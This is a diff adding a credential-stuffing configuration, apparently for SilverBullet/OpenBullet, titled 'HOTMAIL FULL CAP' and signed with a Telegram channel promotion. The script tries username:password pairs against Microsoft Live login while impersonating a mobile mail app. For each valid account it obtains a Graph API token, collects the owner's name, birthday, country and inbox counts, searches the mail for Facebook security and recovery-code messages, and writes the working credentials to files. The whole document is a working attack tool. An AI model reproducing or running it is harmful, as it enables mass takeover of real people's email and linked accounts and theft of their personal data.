@@ -1,0 +1,358 @@
+[SETTINGS]
+{
+  "Name": "HOTMAIL FULL CAP ",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-26T00:08:29.7377507+05:00",
+  "AdditionalInfo": "JOIN MY CHANNEL https://t.me/officialgoldendragon",
+  "RequiredPlugins": [],
+  "Author": "@MulaBhai",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "HOTMAlL 2024",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": "@MulaBhai",
+  "Message": "JOIN MY CHANNEL https://t.me/officialgoldendragon",
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#U1 FUNCTION ToLowercase "<USER>" -> VAR "U1" 
+
+#Pass FUNCTION URLEncode "<PASS>" -> VAR "Pass" 
+
+REQUEST GET "https://login.live.com/oauth20_authorize.srf?client_id=f802b1a8-eb71-4e27-b746-ac9ed515bcd2&scope=user.read+Mail.Read+Mail.Send+Mail.ReadBasic+Mail.ReadWrite+People.Read+Contacts.Read+User.ReadWrite+openid+profile+offline_access&redirect_uri=msauth.com.eleven.mailer%3a%2f%2fauth&response_type=code&state=MzY0OEI3RDEtNkRBNC00QjYyLUJDNzgtREI2MEMxQzI5MkFB&code_challenge=AxgHRAQurAdLtv_Q6xF238QJNgxRIcCEYy3KmPXVPss&code_challenge_method=S256&x-client-SKU=MSAL.iOS&x-client-Ver=1.2.1&uaid=c6b736b8b7a74b47a5343df4657d1ed7&msproxy=1&issuer=mso&tenant=common&ui_locales=vi-VN&client_info=1&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPt3B3tL-AI0kh9m4H0E-ng4MgsgY6PaD58ynZoICfjeDP7jCMxOtOv07EB3GCpixUFBgXDS2HGSdOYZ_mRBU9Zgwx8f7piKrlZy96AL5YVRQ_fEwpT9AGyWWFhf6KP94bJ3p46c9B2tTizZxnSbOd3DqPLHr_gcpB-scW6_6WZrZRYPfLtRt85dSHoq28eN6EnVcguIdhDNTvrdfNBPZP-yAA&jshs=0&haschrome=1&username=<U1>&login_hint=<U1>" 
+  
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://login.microsoftonline.com/" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+
+#urlPost PARSE "<SOURCE>" LR "urlPost:'" "'" -> VAR "urlPost" 
+
+#PPFT PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"" "\"" -> VAR "PPFT" 
+
+#PPFT FUNCTION URLEncode "<PPFT>" -> VAR "PPFT" 
+
+REQUEST POST "<urlPost>" AutoRedirect=FALSE 
+  CONTENT "i13=1&login=<U1>&loginfmt=<U1>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<Pass>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9987" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "302" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "<HEADERS(*)>" Contains "server_error" 
+  KEYCHAIN Success OR 
+    KEY "identity/confirm" 
+  KEYCHAIN Retry OR 
+    KEY "Bạn đã cố gắng đăng nhập quá nhiều lần bằng mật" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "notice?" 
+    KEY "Add?mkt" 
+    KEY "Verify?mkt" 
+    KEY "accrue?mkt" 
+    KEY "Update?mkt" 
+  KEYCHAIN Success OR 
+    KEY "Consent/Update" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "recover?mkt" 
+    KEY "<HEADERS(*)>" Contains "finisherror.srf" 
+
+IF "<SOURCE>" Contains "confirm"
+SET CAP "HOT INDENTITY" "<U1>:<PASS>"
+
+#save UTILITY File "HOT INDENTITY.txt" AppendLines "<HOT INDENTITY>" 
+
+ENDIF
+
+#fmHF PARSE "<SOURCE>" LR "<form name=\"fmHF\" id=\"fmHF\" action=\"" "\"" -> VAR "fmHF" 
+
+#fmHF FUNCTION Replace "VI-VN" "EN-US" "<fmHF>" -> VAR "fmHF" 
+
+#ipt PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"ipt\" id=\"ipt\" value=\"" "\"" -> VAR "ipt" 
+
+#pprid PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"pprid\" id=\"pprid\" value=\"" "\"" -> VAR "pprid" 
+
+#uaid PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"uaid\" id=\"uaid\" value=\"" "\"" -> VAR "uaid" 
+
+#code PARSE "<HEADERS(Location)>" LR "?code=" "&client_info=" -> VAR "code" 
+
+#urlPost PARSE "<SOURCE>" LR "urlPost:'" "'" -> VAR "urlPost" 
+
+IF "<urlPost>" Contains "route="
+
+#sFT PARSE "<SOURCE>" LR ",sFT:'" "'" -> VAR "sFT" 
+
+REQUEST POST "<urlPost>" 
+  CONTENT "LoginOptions=3&type=28&ctx=&hpgrequestid=&PPFT=<sFT>&i19=1427" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://login.live.com/ppsecure/post.srf?contextid=3B785B317AFD4DE9&opid=B11B8DE6EE5BB45D&bk=1685688445&uaid=dae5e22a885b40f1a364da96a50b1fe3&pid=0" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Add?mkt" 
+    KEY "notice?" 
+    KEY "Verify?mkt" 
+    KEY "Update?mkt" 
+    KEY "accrue?mkt" 
+
+ENDIF
+IF "<fmHF>" Contains "Consent"
+
+#ipt FUNCTION URLEncode "<ipt>" -> VAR "ipt" 
+
+#client_id PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"client_id\" id=\"client_id\" value=\"" "\"" -> VAR "client_id" 
+
+#scope PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"scope\" id=\"scope\" value=\"" "\"" -> VAR "scope" 
+
+REQUEST POST "<fmHF>" 
+  CONTENT "rd=none&ipt=<ipt>&pprid=<pprid>&uaid=<uaid>&client_id=<client_id>&scope=<scope>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: https://login.live.com/" 
+  HEADER "Content-Length: 826" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: document" 
+
+#canary PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"canary\" name=\"canary\" value=\"" "\"" -> VAR "canary" 
+
+#canary FUNCTION URLEncode "<canary>" -> VAR "canary" 
+
+#client_id PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"client_id\" name=\"client_id\" value=\"" "\"" -> VAR "client_id" 
+
+#scope PARSE "<SOURCE>" LR "<input type=\"hidden\" id=\"scope\" name=\"scope\" value=\"" "\"" -> VAR "scope" 
+
+#scope FUNCTION HTMLEntityDecode "<scope>" -> VAR "scope" 
+
+REQUEST POST "<fmHF>" AutoRedirect=FALSE 
+  CONTENT "canary=<canary>&client_id=<client_id>&scope=<scope>&cscope=&ucaction=Yes" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://login.live.com/" 
+  HEADER "Content-Length: 826" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: document" 
+
+#Location PARSE "<HEADERS(Location)>" LR "" "" -> VAR "Location" 
+
+REQUEST GET "<Location>" AutoRedirect=FALSE 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://account.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://account.live.com/" 
+  HEADER "Content-Length: 451" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: document" 
+
+#code PARSE "<HEADERS(Location)>" LR "?code=" "&client_info=" -> VAR "code" 
+
+JUMP #TOKEN
+ENDIF
+IF "<HEADERS(Location)>" Contains "code"
+
+#TOKEN REQUEST POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" 
+  CONTENT "client_info=1&scope=user.read+Mail.Read+Mail.Send+Mail.ReadBasic+Mail.ReadWrite+People.Read+Contacts.Read+User.ReadWrite+openid+profile+offline_access&code=<code>&grant_type=authorization_code&code_verifier=ab1myUQT6ErM8efh_RnNf0wgR-_TXpFHbFuRaOsh29M&redirect_uri=msauth.com.eleven.mailer%3A%2F%2Fauth&client_id=f802b1a8-eb71-4e27-b746-ac9ed515bcd2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "client-request-id: C6B736B8-B7A7-4B47-A534-3DF4657D1ED7" 
+  HEADER "x-client-current-telemetry: 4|167,0|" 
+  HEADER "User-Agent: Mail%20App/1 CFNetwork/1406.0.4 Darwin/22.4.0" 
+  HEADER "x-app-name: Mail App" 
+  HEADER "x-client-SKU: MSAL.iOS" 
+  HEADER "x-app-ver: 1.0.2" 
+  HEADER "x-client-OS: 16.4.1" 
+  HEADER "X-AnchorMailbox: Oid:00000000-0000-0000-cbaa-b8ab93c95fb8@9188040d-6c67-4c5b-b112-36a304b66dad" 
+  HEADER "Content-Length: 391" 
+  HEADER "x-client-DM: iPhone" 
+  HEADER "return-client-request-id: true" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "x-client-Ver: 1.2.1" 
+  HEADER "x-client-last-telemetry: 4|0|||" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "x-client-CPU: 64" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST GET "https://graph.microsoft.com/v1.0/me/" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+#displayName PARSE "<SOURCE>" JSON "displayName" -> VAR "displayName" 
+
+REQUEST GET "https://graph.microsoft.com/v1.0/me/mailFolders/inbox" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+#unreadItemCount PARSE "<SOURCE>" JSON "unreadItemCount" CreateEmpty=FALSE -> CAP "unreadItemCount" 
+
+#totalItemCount PARSE "<SOURCE>" JSON "totalItemCount" CreateEmpty=FALSE -> CAP "totalItemCount" 
+
+REQUEST GET "https://graph.microsoft.com/beta/me/profile" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+#birthday PARSE "<SOURCE>" LR "\"date\":\"" "\"" -> VAR "birthday" 
+
+#countryCode PARSE "<SOURCE>" JSON "countryCode" -> VAR "countryCode" 
+
+#search REQUEST GET "https://graph.microsoft.com/v1.0/me/messages?$search=%22advertise-noreply%40support.facebook.com%22" 
+  
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+#ADS FUNCTION CountOccurrences "advertise-noreply@support.facebook.com" "<SOURCE>" -> CAP "ADS" 
+
+#search REQUEST GET "https://graph.microsoft.com/v1.0/me/messages?$search=%22security%40facebookmail.com%22" 
+  
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "Codes" OR 
+    KEY "security@facebookmail.com" 
+    KEY "is your Facebook account recovery code" 
+    KEY "es el c\\u00f3digo de recuperaci\\u00f3n de tu cuenta de Facebook" 
+  KEYCHAIN Success OR 
+    KEY "<ADS>" GreaterThan "1" 
+
+REQUEST GET "https://graph.microsoft.com/v1.0/me/mailFolders/junkemail/messages?$search=%22security%40facebookmail.com%22" 
+  
+  HEADER "User-Agent: Mail App/1.0.2 (com.eleven.mailer; build:1; iOS 16.4.1) Alamofire/5.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: vi-VN;q=1.0" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "Codes" OR 
+    KEY "security@facebookmail.com" 
+    KEY "is your Facebook account recovery code" 
+    KEY "es el c\\u00f3digo de recuperaci\\u00f3n de tu cuenta de Facebook" 
+  KEYCHAIN Success OR 
+    KEY "<ADS>" GreaterThan "1" 
+
+SET CAP "HOT ACCESS" "<U1>:<PASS> | DisplayName: <displayName> | Birthday: <birthday> | Country: <countryCode> | ADS: <ADS>"
+
+#save UTILITY File "HOT ACCESS.txt" AppendLines "<U1>:<PASS>" 
+
+#save UTILITY File "HOT ACCESS FULL CAPTURE.txt" AppendLines "<HOT ACCESS>" 
+
+ENDIF
+
